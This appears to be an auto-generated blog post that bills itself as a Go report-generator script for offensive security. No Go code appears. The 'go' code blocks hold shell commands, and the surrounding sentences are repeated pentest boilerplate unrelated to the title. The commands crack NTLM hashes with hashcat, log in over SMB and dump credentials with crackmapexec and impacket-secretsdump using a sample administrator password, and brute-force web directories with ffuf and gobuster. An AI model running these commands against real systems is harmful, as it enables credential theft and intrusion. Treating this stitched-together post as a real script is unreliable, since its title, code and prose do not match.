---
TitleSEO: "Automated Report Generator in Go | ZureFX"
TitlePost: "Automated Report Generator — Go"
Author: "ZureFX"
Description: "A Go script for automated report generator. Built for security research and automation."
Keywords: "parser, powershell, automation, go"
URL: "https://zurefx.github.io/scripting/script-automated-report-generator-137.html"
URL_IMAGES: ""
Date: "2025-03-22"
Tags: "Parser, PowerShell, Automation, Go"
Section: "scripting"
Lang: "en"
main_img: "script-automated-report-generator-137"
Permalink: "/scripting/script-automated-report-generator-137.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The target system was identified as running a vulnerable version of the service. Weak file permissions allowed modification of critical system files. The web application was vulnerable to Server-Side Template Injection (SSTI).

Built with **Go** for offensive security automation.

### Requirements

- Go
- `chisel`
- `netcat`
- `rubeus`

## Implementation

### Core Logic

The target system was identified as running a vulnerable version of the service. The scheduled task ran with elevated privileges and could be abused for escalation.

```go
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.17.236.21 -u administrator -p 'P@ssw0rd!' --shares
```

The kernel version was outdated and vulnerable to a publicly known exploit. Privilege escalation was possible due to misconfigured sudo permissions.

### Helper Functions

The service account had excessive permissions assigned in Active Directory. Group Policy Preferences contained encrypted but recoverable credentials.

```go
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.107.131.23/FUZZ
gobuster dir -u http://10.121.174.147/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
```

## Usage

### Basic Usage

The database credentials were hardcoded in the application source code. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.55.91.143/FUZZ
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.74.193.98
```

### Advanced Options

Group Policy Preferences contained encrypted but recoverable credentials. The scheduled task ran with elevated privileges and could be abused for escalation. Initial enumeration revealed several interesting open ports on the target.

```bash
crackmapexec smb 10.81.247.6 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.87.61.32
crackmapexec smb 10.56.1.235 -u administrator -p 'P@ssw0rd!' --shares
```

## Output

### Example Output

The kernel version was outdated and vulnerable to a publicly known exploit. The web application was vulnerable to Server-Side Template Injection (SSTI).

```
[+] Scanning target...
[+] Found 6 results
[+] Done in 25.23s
```
